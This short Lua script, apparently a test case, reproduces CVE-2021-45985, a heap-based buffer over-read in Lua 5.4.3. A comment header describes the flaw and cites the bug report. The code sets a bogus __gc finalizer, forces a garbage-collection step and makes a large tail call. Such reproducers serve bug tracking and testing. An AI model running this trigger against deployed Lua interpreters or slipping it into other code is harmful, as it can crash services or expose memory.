--[[
CVE-2021-45985 - https://www.cvedetails.com/cve/CVE-2021-45985/

In Lua 5.4.3, an erroneous finalizer called during a tail call leads to a heap-based buffer over-read.

First Report: http://lua-users.org/lists/lua-l/2021-12/msg00019.html
Original Exploit: https://www.lua.org/bugs.html#5.4.3-11

]]

local x = {}; for i=1, 2000 do x[i] = i end
local function f()  end
local function g() return f(table.unpack(x)) end
collectgarbage("step")
setmetatable({}, {__gc = 1})
g()
